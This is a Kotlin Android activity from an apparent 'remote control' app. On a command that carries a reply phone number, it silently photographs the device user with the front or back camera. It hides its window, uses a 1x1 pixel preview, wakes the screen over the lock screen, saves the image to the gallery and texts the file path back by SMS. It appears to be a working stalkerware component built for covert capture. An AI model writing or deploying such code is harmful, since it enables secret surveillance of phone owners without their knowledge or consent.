package com.example.remotecontrol

import android.Manifest
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Log
import android.view.SurfaceHolder
import android.view.SurfaceView
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class CameraActivity : AppCompatActivity() {

    private lateinit var replyTo: String
    private lateinit var cameraManager: CameraManager
    private lateinit var imageReader: ImageReader
    private lateinit var backgroundHandler: Handler
    private lateinit var backgroundThread: HandlerThread
    private var cameraDevice: CameraDevice? = null
    private var facing = CameraCharacteristics.LENS_FACING_BACK

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Ko'rinmas oyna
        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        )
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        replyTo = intent.getStringExtra("reply_to") ?: ""
        val camera = intent.getStringExtra("camera") ?: "back"
        facing = if (camera == "front") CameraCharacteristics.LENS_FACING_FRONT
                 else CameraCharacteristics.LENS_FACING_BACK

        val surfaceView = SurfaceView(this)
        surfaceView.layoutParams = android.view.ViewGroup.LayoutParams(1, 1)
        setContentView(surfaceView)

        startBackgroundThread()

        surfaceView.holder.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) {
                takePicture(holder)
            }
            override fun surfaceChanged(holder: SurfaceHolder, f: Int, w: Int, h: Int) {}
            override fun surfaceDestroyed(holder: SurfaceHolder) {}
        })
    }

    private fun takePicture(holder: SurfaceHolder) {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            CommandHandler(this).sendSms(replyTo, "❌ Kamera ruxsati yo'q")
            finish()
            return
        }

        try {
            cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == facing
            } ?: cameraManager.cameraIdList[0]

            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                val file = saveImage(bytes)
                CommandHandler(this).sendSms(replyTo, "📸 Rasm olindi!\nFayl: ${file.name}\nYo'l: ${file.absolutePath}")
                Log.d("CameraActivity", "Rasm saqlandi: ${file.absolutePath}")
                cleanup()
            }, backgroundHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(imageReader.surface)
                    val surfaces = listOf(imageReader.surface, holder.surface)
                    camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(captureRequest.build(), null, backgroundHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) { cleanup() }
                    }, backgroundHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { cleanup() }
                override fun onError(camera: CameraDevice, error: Int) {
                    CommandHandler(this@CameraActivity).sendSms(replyTo, "❌ Kamera xato: $error")
                    cleanup()
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            Log.e("CameraActivity", "Xato: ${e.message}")
            CommandHandler(this).sendSms(replyTo, "❌ Xato: ${e.message}")
            cleanup()
        }
    }

    private fun saveImage(bytes: ByteArray): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val dcim = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM)
        val camera = File(dcim, "Camera")
        if (!camera.exists()) camera.mkdirs()
        val file = File(camera, "RC_$timestamp.jpg")
        FileOutputStream(file).use { it.write(bytes) }
        // Gallery ga qo'shish
        android.media.MediaScannerConnection.scanFile(this, arrayOf(file.absolutePath), arrayOf("image/jpeg"), null)
        return file
    }

    private fun cleanup() {
        try { cameraDevice?.close() } catch (_: Exception) {}
        try { backgroundThread.quitSafely() } catch (_: Exception) {}
        finish()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread.looper)
    }
}
